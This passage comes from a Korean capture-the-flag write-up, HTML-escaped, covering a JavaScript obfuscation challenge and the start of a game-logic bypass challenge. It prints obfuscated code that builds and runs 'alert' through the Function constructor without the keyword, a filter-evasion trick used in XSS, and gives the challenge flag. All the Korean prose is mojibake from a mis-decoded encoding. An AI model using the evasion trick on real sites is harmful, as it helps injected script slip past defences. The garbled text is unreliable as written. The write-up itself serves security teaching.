ìˆëŠ” ìŠ¤í¬ë¦½íŠ¸ êµ¬ë¬¸ì´ ì‹¤í–‰ë˜ì–´ ê²°êµ­ ì¿ í‚¤ë¥¼ íƒˆì·¨ í•  ìˆ˜ ìˆë‹¤. &lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;06cabf18-6c1f-45a5-a162-ac45e5a9a0fe&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;figure id=&quot;ef2dfe41-30a0-4967-a8e2-3c9ea882447a&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob913.png&quot;&gt;&lt;img style=&quot;width:782px&quot; src=&quot;/assets/bob/bob913.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;838e4d96-d75e-49b8-b9b0-fd08f8363b4e&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;c8cc09b4-acf1-41bd-bda9-831504b47340&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h2 id=&quot;88cc70cc-816c-4db4-91db-cfa0f1d61fde&quot; class=&quot;&quot;&gt;King musae&lt;/h2&gt;&lt;hr id=&quot;49de7dcb-b368-489e-b1f2-a7d7f1913684&quot;/&gt;&lt;figure id=&quot;967fdf64-33cc-4be3-a447-3abddc3ff9cd&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob914.png&quot;&gt;&lt;img style=&quot;width:717px&quot; src=&quot;/assets/bob/bob914.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class=&quot;block-color-gray_background callout&quot; style=&quot;white-space:pre-wrap;display:flex&quot; id=&quot;11c0c9f3-ff2e-465e-9be1-a31603a7800b&quot;&gt;&lt;div style=&quot;font-size:1.5em&quot;&gt;&lt;span class=&quot;icon&quot;&gt;ğŸ’¡&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;width:100%&quot;&gt;[Javasciprt ë‚œë…í™”]
í•´ë‹¹ ë¬¸ì œëŠ” Javascript ë‚œë…í™”ì´ë©°, ê°„ë‹¨í•˜ê²Œ í”Œë˜ê·¸ê°€ ìˆ¨ê²¨ì ¸ ìˆëŠ” ë¬¸ì œì„
(ë³¸ ë¬¸ì œëŠ” &lt;a href=&quot;https://m.blog.naver.com/chiot_aile/221592247073&quot;&gt;ë¡œì–„ ë§ˆì¹´ë¡± ì•µë¬´ìƒˆ&lt;/a&gt;ê°€ ìƒê°ë‚˜ì„œ ë§Œë“¤ê²Œ ë˜ì—ˆìœ¼ë©°,  ë¼ì˜¨ì— ë†€ëŸ¬ì˜¤ì‹œë©´ ê¼­ ì—¬ê¸° ë§ˆì¹´ë¡±ì§‘ ê°€ì•¼ë©ë‹ˆë‹¤.)

í’€ì´ëŠ” ì–´ë µì§€ ì•Šìœ¼ë©°, ê°„ë‹¨í•˜ë‹¤. ë³„ë‹¤ë¥¸ ì•ˆí‹° ë””ë²„ê¹… ë° ë³µì¡í•œ ë‚œë…í™”ê°€ ì•„ë‹Œ ë‹¨ìˆœíˆ í”Œë˜ê·¸ê°€ ì¶œë ¥ë˜ì§€ ëª»í•˜ë„ë¡ ë³€ìˆ˜ì— ì €ì¥ë˜ì–´ìˆëŠ” ê±¸ ì°¾ëŠ” ë¬¸ì œì„&lt;/div&gt;&lt;/figure&gt;&lt;p id=&quot;003f9d31-be58-4d14-9801-3214e198ef78&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h3 id=&quot;0666b32d-9c63-4b26-8030-a3bdebd7ea14&quot; class=&quot;&quot;&gt;1. ë¬¸ì œ íŒŒì•…í•˜ê¸°&lt;/h3&gt;&lt;ul id=&quot;ed588fe6-cad0-47e8-8ebc-ac7abcee3918&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë¬¸ì œ ì‚¬ì´íŠ¸ì— ì ‘ì†í•˜ë©´ Javascript Alertë¡œ &amp;quot;&lt;strong&gt;find Flag&lt;/strong&gt;&amp;quot;ë¥¼ ì¶œë ¥ëœë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;6a753f0a-917d-4ebc-b2ba-21ee53941e78&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob915.png&quot;&gt;&lt;img style=&quot;width:449px&quot; src=&quot;/assets/bob/bob915.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;f127b2b3-548f-4d35-9683-dca5494ad265&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;ul id=&quot;9158e8a6-e287-4389-9b19-c5f849588a35&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;Chrome ê°œë°œì ë„êµ¬ì¸ ì†ŒìŠ¤ì½”ë“œ ë³´ê¸°ë¥¼ ëˆŒëŸ¬ ìë°”ìŠ¤í¬ë¦½íŠ¸ ì½”ë“œë¥¼ í™•ì¸í•´ë³´ë©´ ì•„ë˜ì™€ ê°™ì´ ë‚œë…í™”ëœ ìë°”ìŠ¤í¬ë¦½íŠ¸ ì½”ë“œë¥¼ í™•ì¸í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;748301c7-3edf-4d55-80fd-37afb660e276&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;pre id=&quot;b48fb4e7-cc3e-460d-8df9-cfcb6a742373&quot; class=&quot;code&quot;&gt;&lt;code&gt;ğ“†“ = &amp;quot;{}&amp;quot;,ğ“…§=&amp;#x27;&amp;#x27;,ğ“ƒŸ=&amp;#x27;@&amp;#x27;,ğ“…€=&amp;quot;test&amp;quot;,ğ“…‚=&amp;#x27;&amp;#x27;,ğ“Š=ğ“…‚+{},ğ“†‚ = &amp;#x27;&amp;#x27;,ğ“‡=ğ“…‚,ğ“…¿ = ğ“…‚+ğ“…‚[[]],ğ“†Ÿ=ğ“…‚,++ğ“‡,ğ“†Ÿ=ğ“Š[++ğ“‡],++ğ“†‚,++ğ“†‚,++ğ“†‚,ğ“†Ÿ+=ğ“Š[--ğ“‡],++ğ“†‚,ğ“†Ÿ+=ğ“Š[++ğ“‡],ğ“†Ÿ+=ğ“†“[ğ“…§++],ğ“„§=ğ“Š,--ğ“‡,--ğ“‡,ğ“†²=ğ“…¿[ğ“†‚++], ğ“†²+=ğ“…¿[ğ“†‚++],ğ“†²+=ğ“…¿[ğ“†‚++],++ğ“†‚,ğ“†²+=ğ“…¿[ğ“†‚++],ğ“‚€=!ğ“…‚+ğ“…‚,ğ“„=!ğ“‚€+ğ“…‚,++ğ“‡,ğ“…§,ğ“†£=ğ“‚€[ğ“…‚++],ğ“Š=ğ“‚€[ğ“‡=ğ“…‚],ğ“†‚--,--ğ“†‚,ğ“†Œ=ğ“Š+ğ“ƒŸ+ğ“Š[ğ“‡]+ğ“…¿[--ğ“†‚],ğ“¢=++ğ“‡+ğ“…‚,ğ“†—=ğ“Š[ğ“‡+ğ“¢],ğ“†Œ+=ğ“†“[ğ“…§],ğ“†“[ğ“†¡=ğ“†Ÿ+ğ“„§+ğ“†Œ],ğ“‚€[ğ“†—+=ğ“Š[ğ“…‚]+(ğ“‚€.ğ“„+ğ“Š)[ğ“…‚]+ğ“„[ğ“¢]+ğ“†£+ğ“Š+ğ“‚€[ğ“‡]+ğ“†—+ğ“†£+ğ“Š[ğ“…‚]+ğ“Š][ğ“†—](ğ“„[ğ“…‚]+ğ“„[ğ“‡]+ğ“‚€[ğ“¢]+ğ“Š+ğ“†£+&amp;quot;(&amp;#x27;&amp;quot;+ğ“†²+&amp;quot; Flag&amp;#x27;)&amp;quot;)``&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;d1f92062-b5dc-4725-a684-643403da57a1&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ìš°ì„  ë‚œë…í™”ëœ ìë°”ìŠ¤í¬ë¦½íŠ¸ë¥¼ íŒŒì•…í•˜ê¸° ì „ &amp;quot;alert&amp;quot; ë¬¸ìì—´ ì—†ì´ alertê°€ ì‹¤í–‰ëœ ê±´ ì•Œ ìˆ˜ ìˆìœ¼ë©°,  í•´ë‹¹ ì½”ë“œê°€ ì–´ë–»ê²Œ ì‹¤í–‰ë˜ì—ˆëŠ”ì§€ &amp;quot;&lt;strong&gt;`&lt;/strong&gt;&amp;quot; ë²¡í„°ë¥¼ ì œê±°í•˜ì—¬ ë‚œë…í™”ëœ ìë°”ìŠ¤í¬ë¦½íŠ¸ê°€ ì‹¤í–‰ë˜ì§€ ì•Šë„ë¡ chrome consoleì— ë„£ì–´ë³´ë©´ ì•„ë˜ì™€ ê°™ì´ ì½”ë“œê°€ êµ¬í˜„ë˜ì–´ ìˆëŠ” ê±¸ ì•Œ ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;8c5b482e-ef2c-4696-bea9-9f75f256bfdb&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;figure id=&quot;750e5892-aafe-4615-a502-ccdf2d15a0f0&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob916.png&quot;&gt;&lt;img style=&quot;width:1340px&quot; src=&quot;/assets/bob/bob916.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;7d82554f-41ec-4949-927b-bf4e11d9f474&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;í•˜ì§€ë§Œ ë³€ìˆ˜ì— ì €ì¥ëœ FlagëŠ” ì•Œ ìˆ˜ ì—†ì—ˆì§€ë§Œ ë‚œë…í™”ëœ ì½”ë“œë¥¼ í†µí•˜ì—¬ alertê°€ ì‹¤í–‰ëœê±´ ì•Œ ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;5ad38e5b-23ac-4118-ac49-1aa7a4b9e589&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;9a353204-95b1-4742-bb82-1912939fc00a&quot; class=&quot;&quot;&gt;ë³´ë‹¤ ì‰¬ìš´ ì˜ˆì œëŠ” &amp;quot;&lt;a href=&quot;https://twitter.com/aemkei/status/1262872762621837314&quot;&gt;Martin Kleppe&lt;/a&gt;&amp;quot;ê°€ ì‘ì„±í•œ ì½”ë“œë¥¼ ë³´ë©´ ë” ì‰½ê²Œ ì•Œ ìˆ˜ ìˆë‹¤.&lt;/p&gt;&lt;p id=&quot;b81072ad-1855-4806-88cc-c679498fde93&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;pre id=&quot;d3597522-83fa-40a7-b47d-723efec36132&quot; class=&quot;code&quot;&gt;&lt;code&gt;const ğ“€€ = &amp;#x27;ğ“…‚&amp;#x27;;
function ğ“†£(ğ“‚€){ alert(ğ“‚€); }
ğ“†£(ğ“€€);&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;df114883-6dff-40fc-ba6e-5d6c7239970b&quot; class=&quot;&quot;&gt;[Martin Kleppeì˜ special characters]&lt;/p&gt;&lt;p id=&quot;5a4920ae-8944-4fd8-a786-ddd6728c56ee&quot; class=&quot;&quot;&gt;ìœ„ ì½”ë“œë¥¼ ë¸Œë¼ìš°ì €ì—ì„œ ì‹¤í–‰ë˜ë©´ ìƒˆê°€ ì¶œë ¥ë˜ëŠ”ê±¸ ë³¼ ìˆ˜ ìˆìœ¼ë©°, ìœ„ ì½”ë“œë¥¼ í•˜ë‚˜ì”© ì„¤ëª…í•˜ë©´&lt;/p&gt;&lt;p id=&quot;0813ce48-7d08-4b2b-be8c-48ec941d8538&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;0a82dd03-834c-4ad3-9217-70d2f8f924d7&quot; class=&quot;&quot;&gt;ë¨¼ì € &amp;quot;&lt;strong&gt;ğ“€€&lt;/strong&gt;&amp;quot; ë³€ìˆ˜ì— ì‹±ê¸€ ì¿¼í„°ë¡œ ë¬¸ìì—´ë¡œ ë§Œë“¤ì–´ &amp;#x27;&lt;strong&gt;ğ“…‚&lt;/strong&gt;&amp;#x27; ìƒˆë¥¼ ì €ì¥í•œë‹¤.&lt;/p&gt;&lt;p id=&quot;78328bd9-d4e9-47a0-a37a-b382e491f035&quot; class=&quot;&quot;&gt;ê·¸ë¦¬ê³  ì‚¬ìš©ì ì •ì˜ í•¨ìˆ˜ë¥¼ ë§Œë“œëŠ” ê³¼ì •ì—ì„œ í•¨ìˆ˜ ì´ë¦„ ëŒ€ì‹  &amp;quot;ğ“†£&amp;quot; ì¥ìˆ˜ í’ëŒ•ì´ë¡œ ì„ ì–¸í•˜ê³  ì¸ìëª… ëŒ€ì‹  &amp;quot;ğ“‚€&amp;quot; ë‚˜ë­‡ìì„ ì„ ì–¸í•˜ê³  ë‚´ë¶€ ë¡œì§ì€ alertë¥¼ í†µí•˜ì—¬ ì „ë‹¬ëœ ì¸ì(ë‚˜ë­‡ì)ë¥¼ í†µí•˜ì—¬ ì¶œë ¥ë˜ëŠ” ë¡œì§ì´ë‹¤.&lt;/p&gt;&lt;p id=&quot;1f95f016-4674-43f5-bda8-a4c1ba6cdba0&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;0d9824a7-c47a-4f39-a1e1-5395a3c1d7df&quot; class=&quot;&quot;&gt;ê·¸ëŸ¬ë¯€ë¡œ ìµœì¢…ì ìœ¼ë¡œ ì¥ìˆ˜ í’ëŒ•ì´(í•¨ìˆ˜)ë¥¼ ìƒˆê°€ ì €ì¥ëœ &amp;quot;&lt;strong&gt;ğ“€€&amp;quot;&lt;/strong&gt;ë³€ìˆ˜ë¥¼ ì¸ìë¡œ ì „ë‹¬í•˜ì—¬ ê²°êµ­ì—” ìƒˆê°€ ì¶œë ¥ë˜ëŠ” ë¡œì§ì´ë‹¤.&lt;strong&gt; &lt;/strong&gt;ì—¬ê¸°ê¹Œì§€ ì´í•´ê°€ ë˜ì—ˆë‹¤ë©´ ì•„ë˜ ì˜ˆì œì—ì„œ ë‚œë…í™”ì— ëŒ€í•´ ì¢€ë” ì•Œì•„ë³´ë„ë¡ í•˜ì.&lt;/p&gt;&lt;p id=&quot;69c41407-ec5c-4a2c-b95e-570b0a2d6f3f&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;79b06cdf-fe30-4b8f-a9c5-e6ad6991ec5c&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h3 id=&quot;27013a0d-2a3f-479f-84a0-19e75215e5b5&quot; class=&quot;&quot;&gt;2. ë¡œì§ íŒŒì•…í•˜ê¸°&lt;/h3&gt;&lt;pre id=&quot;fb6abe0a-2b56-46e4-8f8f-a054203526d1&quot; class=&quot;code&quot;&gt;&lt;code&gt;ğ“…‚=&amp;#x27;&amp;#x27;             //    &amp;quot;&amp;quot;
ğ“‚€=!ğ“…‚+ğ“…‚        //    &amp;quot;true&amp;quot;
ğ“„=!ğ“‚€+ğ“…‚         //    &amp;quot;false&amp;quot;
ğ“Š=ğ“…‚+{}          //    &amp;quot;[object Object]&amp;quot;

ğ“†£=ğ“‚€[ğ“…‚++]        //   &amp;quot;r&amp;quot; (ğ“…‚ = 2)
ğ“Š=ğ“‚€[ğ“‡=ğ“…‚]       //   &amp;quot;u&amp;quot; (ğ“‡  = 2)
ğ“¢=++ğ“‡+ğ“…‚          //    5  (ğ“‡ = 3), (ğ“‡3 + ğ“…‚2)
ğ“†—=ğ“Š[ğ“‡+ğ“¢]         //    &amp;quot;O&amp;quot;


ğ“‚€                 //   &amp;quot;true&amp;quot;
ğ“†—+=ğ“Š[ğ“…‚]         //   &amp;quot;co&amp;quot;
(ğ“‚€.ğ“„+ğ“Š)[ğ“…‚]    //    &amp;quot;n&amp;quot;
ğ“„[ğ“¢]              //   &amp;quot;s&amp;quot;
ğ“†£                 //   &amp;quot;t&amp;quot;
ğ“Š                 //   &amp;quot;r&amp;quot;
ğ“Š[ğ“…‚]            //   &amp;quot;o&amp;quot;
ğ“Š                //    &amp;quot;r&amp;quot;
ğ“†—                 //   &amp;quot;constructor&amp;quot;


ğ“‚€[ğ“†—+=ğ“Š[ğ“…‚]+(ğ“‚€.ğ“„+ğ“Š)[ğ“…‚]+ğ“„[ğ“¢]+ğ“†£+
ğ“Š+ğ“‚€[ğ“‡]+ğ“†—+ğ“†£+ğ“Š[ğ“…‚]+ğ“Š][ğ“†—]
//   Æ’ Function() { [native code] }

ğ“„[ğ“…‚]             //   &amp;quot;a&amp;quot;
ğ“„[ğ“‡]              //   &amp;quot;l&amp;quot;
ğ“‚€[ğ“¢]              //   &amp;quot;e&amp;quot;
ğ“Š                 //   &amp;quot;r&amp;quot;
ğ“†£                  //   &amp;quot;t&amp;quot;

ğ“„[ğ“…‚]+ğ“„[ğ“‡]+ğ“‚€[ğ“¢]+ğ“Š+ğ“†£ // &amp;quot;alert&amp;quot;


ğ“‚€[ğ“†—+=ğ“Š[ğ“…‚]+(ğ“‚€.ğ“„+ğ“Š)[ğ“…‚]+ğ“„[ğ“¢]+ğ“†£+
ğ“Š+ğ“‚€[ğ“‡]+ğ“†—+ğ“†£+ğ“Š[ğ“…‚]+ğ“Š][ğ“†—](ğ“„[ğ“…‚]+ğ“„[ğ“‡]+ğ“‚€[ğ“¢]+ğ“Š+ğ“†£+&amp;quot;(&amp;#x27;&amp;quot;+ğ“†²+&amp;quot; Flag&amp;#x27;)&amp;quot;)
// Æ’ anonymous(
// ) {
// alert(&amp;#x27;find Flag&amp;#x27;)
// }

ğ“‚€[ğ“†—][ğ“†—]
// Æ’ Function() { [native code] }

ğ“‚€[ğ“†—][ğ“†—](ğ“„[ğ“…‚]+ğ“„[ğ“‡]+ğ“‚€[ğ“¢]+ğ“Š+ğ“†£+&amp;quot;(&amp;#x27;DongDongE&amp;#x27;)&amp;quot;)``
//Æ’ anonymous(
//) {
//alert(&amp;#x27;DongDongE&amp;#x27;)
//}&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;9d8bf489-98e6-4e26-bbf4-fcad3d98e93f&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ìœ„ì™€ ê°™ì´ alertë¥¼ ì¶œë ¥í•˜ê¸° ìœ„í•´ ê°ì¢… ë¬¸ìì—´ ì¡°í•©ìœ¼ë¡œ Functionì„ ë§Œë“¤ê³  ë¬¸ìë¥¼ ì¡°í•© í•œë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;3ce67843-deb8-4885-8ec9-a885331cdc65&quot; class=&quot;&quot;&gt;ìœ„ ì½”ë“œê°€ ê·¸ë˜ë„ ì–´ë µë‹¤ë©´ ì•„ë˜ ì˜ˆì œì—ì„œ ê°„ë‹¨í•˜ê²Œ í’€ì–´ì„œ ì•Œì•„ë³´ë„ë¡ í•˜ì.&lt;/p&gt;&lt;p id=&quot;e00d001e-48e9-4153-8b85-f5f7e1fed80c&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;pre id=&quot;cbe43603-7ac5-4d2d-97b5-972be15160c1&quot; class=&quot;code&quot;&gt;&lt;code&gt;ğ“„[ğ“…‚]             //   &amp;quot;a&amp;quot;       &amp;quot;false&amp;quot; ë¬¸ìì—´ì˜ 2ë²ˆì§¸ &amp;quot;a&amp;quot;
ğ“„[ğ“‡]              //   &amp;quot;l&amp;quot;       &amp;quot;false&amp;quot; ë¬¸ìì—´ì˜ 3ë²ˆì§¸ &amp;quot;ã…£&amp;quot;
ğ“‚€[ğ“¢]              //   &amp;quot;e&amp;quot;       &amp;quot;true&amp;quot;  ë¬¸ìì—´ì˜ 4ë²ˆì§¸ &amp;quot;e&amp;quot;
ğ“Š                 //   &amp;quot;r&amp;quot;       &amp;quot;true&amp;quot;  ë¬¸ìì—´ì˜ 2ë²ˆì§¸ &amp;quot;r&amp;quot;
ğ“†£                  //   &amp;quot;t&amp;quot;       &amp;quot;true&amp;quot;  ë¬¸ìì—´ì˜ 1ë²ˆì§¸ &amp;quot;t&amp;quot;&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;d5f39a13-423d-4423-871f-f4c4a446100e&quot; class=&quot;&quot;&gt;ìœ„ ì½”ë“œì™€ ê°™ì´ &amp;quot;false&amp;quot;ì™€ &amp;quot;true&amp;quot;ì˜ ë¬¸ìì—´ì„ í•˜ë‚˜ì”© ì¶”ì¶œí•˜ì—¬ ì¡°í•©í•˜ë©´ &amp;quot;alert&amp;quot;ê°€ ë˜ì–´ alertê°€ ë¬¸ìì—´ì—ì„œ functionìœ¼ë¡œ ì‹¤í–‰ë˜ë„ë¡ í•˜ëŠ” ì›ë¦¬ì´ë‹¤.&lt;/p&gt;&lt;p id=&quot;3c1a8e9e-a5d2-4709-8858-094e55b5a7e7&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;570ce67c-9516-4731-9d35-ade7a497b2c8&quot; class=&quot;&quot;&gt;ê·¸ëŸ¬ë©´ ìœ„ í”Œë˜ê·¸ë¥¼ ì–»ê¸° ìœ„í•´ í•˜ë‚˜ì”© ë³€ìˆ˜ë¥¼ ì¶œë ¥í•´ë³´ë©´ í”Œë˜ê·¸ê°€ ì¶œë ¥ëœë‹¤.&lt;/p&gt;&lt;p id=&quot;c53b7f5f-b11f-40cd-bc80-04911eb9c3dc&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;pre id=&quot;2a2a510c-023e-4750-a67f-3512d96b6e87&quot; class=&quot;code&quot;&gt;&lt;code&gt;ğ“†¡=ğ“†Ÿ+ğ“„§+ğ“†Œ
&amp;quot;bob{[object Object]r@on}&amp;quot;&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;0029245f-e136-4eca-b4a4-4be0b6b63596&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;ul id=&quot;67a698e7-603f-463d-a716-b441afa85b5a&quot; class=&quot;to-do-list&quot;&gt;&lt;li&gt;&lt;div class=&quot;checkbox checkbox-on&quot;&gt;&lt;/div&gt; &lt;span class=&quot;to-do-children-checked&quot;&gt;Flag is bob{[object Object]r@on}&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;d1159de1-4d54-4d7d-9e73-90a41c597475&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;ul id=&quot;46c9d633-d005-42fa-a50d-89907e79ac8f&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ê°„í˜¹ í”Œë˜ê·¸ê°’ì´ ìë°”ìŠ¤í¬ë¦½íŠ¸ì˜ &lt;strong&gt;&amp;quot;object Object&lt;/strong&gt;&amp;quot;ê°€ ìˆëŠ”ê±¸ ì˜ë¬¸ ë“¤ ìˆ˜ ìˆì§€ë§Œ í•˜ë‚˜ì˜ ë¬¸ìë¥¼ ì¶”ì¶œí›„ ì¡°í•©í•˜ê¸° ìœ„í•´ 3-5ì¤„ ë¼ì¸ì´ ë” ì¶”ê°€ëœë‹¤. ì˜ˆë¥¼ ë“¤ì–´ í”Œë˜ê·¸ë¥¼ &amp;quot;bob[R@onWhiteHat_1235]&amp;quot; ì´ëŸ°ì‹ìœ¼ë¡œ ì¶œë ¥í•œë‹¤ê³  í•˜ë©´ 17ê¸€ì ì´ë¯€ë¡œ 17 * 3 = 51ë¼ì¸ì´ ë” ì¶”ê°€ë˜ë¯€ë¡œ ë‚œë…í™”ì„ í’€ì–´ë‚˜ê°€ëŠ” ê³¼ì •ì—ì„œ ë‚œì´ë„ê°€ ìƒìŠ¹ë˜ê³  ë³µì¡í•˜ë¯€ë¡œ ê°„ë‹¨í•œ í”Œë˜ê·¸ë¥¼ ë„£ì–´ ë‚œì´ë„ë¥¼ ë‚®ì¶”ê²Œ ë¨.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;f25992cd-e477-4608-bdfd-88b7a7730894&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;077cd998-97f7-44b0-9e04-92c72f9aafe7&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h2 id=&quot;48ebbbc5-61a9-4180-a3cf-84bb289d683a&quot; class=&quot;&quot;&gt;Fun Fun Game&lt;/h2&gt;&lt;hr id=&quot;044ebf08-24a5-4a28-9866-698b49d18006&quot;/&gt;&lt;figure id=&quot;d73e7fb2-9c22-4fbc-a314-57345d8dc6b7&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob917.png&quot;&gt;&lt;img style=&quot;width:714px&quot; src=&quot;/assets/bob/bob917.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class=&quot;block-color-gray_background callout&quot; style=&quot;white-space:pre-wrap;display:flex&quot; id=&quot;ec5491fd-89a5-4049-8394-dd04081237de&quot;&gt;&lt;div style=&quot;font-size:1.5em&quot;&gt;&lt;span class=&quot;icon&quot;&gt;ğŸ’¡&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;width:100%&quot;&gt;[Javasciprt ì¡°ì‘]
ë¬¸ì œ ì‚¬ì´íŠ¸ì— ì ‘ì† ì‹œ ì•„ë˜ì™€ ê°™ì€ í˜ì´ì§€ê°€ ì¶œë ¥ë˜ë©° ê²Œì„ì´ ì§„í–‰ë˜ë©° ê²Œì„ í”Œë ˆì´ ë°©ë²•ì€ &amp;quot;&lt;mark class=&quot;highlight-red&quot;&gt;&lt;strong&gt;BOB&lt;/strong&gt;&lt;/mark&gt;&amp;quot; ë¼ê³  ì“°ì—¬ ìˆëŠ” ìš°ì£¼ê´´ë¬¼ì„ ë‹¤ ì œê±°ë˜ì–´ì•¼ Flagê°€ ë‚˜ì˜¤ëŠ” ë¬¸ì œì„.
(ë³¸ ë¬¸ì œëŠ” &lt;a href=&quot;https://www.raoncorp.com/ko/recruit/raonlife&quot;&gt;Raon Secure Fun Zone&lt;/a&gt;ë¥¼ ëª¨í‹°ë¸Œë¡œ ì œì‘ë¨)

í’€ì´ëŠ” ëŒ€ëµ 2ê°€ì§€ë¡œ ìƒê°í•  ìˆ˜ ìˆë‹¤.
ì²« ë²ˆì§¸ëŠ” ì§ì ‘ ê²Œì„ í”Œë ˆì´ë¥¼ ì§„í–‰ í›„ ì „ë¶€ ì œê±°í•˜ì—¬ Flagë¥¼ ì–»ê±°ë‚˜ (Physical),
ë‘ ë²ˆì§¸ ë°©ë²•ìœ¼ë¡œëŠ” ìë°”ìŠ¤í¬ë¦½íŠ¸ ë¡œì§ì„ ìš°íšŒí•˜ì—¬ ê²Œì„í•µ(ë¬´ì , ìŠ¤í”¼ë“œ)ì„ ì œì‘í•˜ì—¬ ê²Œì„ì„ ì§„í–‰í•˜ê±°ë‚˜ ë˜ëŠ” ê²Œì„ ì§„í–‰í•  í•„ìš” ì—†ì´ Flagë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤.&lt;/div&gt;&lt;/figure&gt;&lt;p id=&quot;50e83883-48a5-461f-99c6-f8a4612c2def&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;703e931d-fcd4-4f01-bfa3-146cfaae806f&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;figure id=&quot;29c5337d-0e81-4e36-b1f0-7e59e2ede0e0&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/game_1.gif&quot;&gt;&lt;img style=&quot;width:1012px&quot; src=&quot;/assets/bob/game_1.gif&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;6b7b28fc-481b-4381-98f7-74ad6eba97a0&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;e92f8be2-5ceb-465a-8571-433b5b7e6e50&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h3 id=&quot;12bfc1fb-74d5-422d-82e2-82ad73e9048b&quot; class=&quot;&quot;&gt;&lt;strong&gt;1. ë¬¸ì œ ë¡œì§ íŒŒì•…í•˜ê¸°&lt;/strong&gt;&lt;/h3&gt;&lt;ul id=&quot;a62fb401-1482-4180-a1a1-6b5d5639c457&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë¬¸ì œë¥¼ íŒŒì•…í•˜ê¸° ìœ„í•´ ê²Œì„ í•œíŒì„ ì§„í–‰í•œë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;79c70d10-a4c0-4a8a-8660-c43241b495a3&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;figure id=&quot;caee6d2f-561c-4213-b2c5-788dd8476b33&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob918.png&quot;&gt;&lt;img style=&quot;width:1405px&quot; src=&quot;/assets/bob/bob918.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;7cbd8941-7266-41d9-a8f2-2add97a646dc&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;60 Pointê¹Œì§€ ìŒ“ê³  &amp;quot;&lt;strong&gt;Game Over&lt;/strong&gt;&amp;quot;ë˜ì–´ &amp;quot;&lt;strong&gt;Restart&lt;/strong&gt;&amp;quot; ë²„íŠ¼ì„ ëˆ„ë¥¸ ìƒíƒœì˜  íŒ¨í‚· History ì´ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;276006ca-b92c-4c56-a4d7-46b23d6a4358&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;ul id=&quot;99f1e4a4-50a2-4cf7-94f7-32035748767f&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì•„ë˜ íŒ¨í‚·ì„ í†µí•˜ì—¬ í•œë²ˆ ì‚´í´ë³´ë„ë¡ í•˜ì.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;3ee57ca4-23e5-44b9-ba34-165485030b91&quot; class=&quot;&quot;&gt;
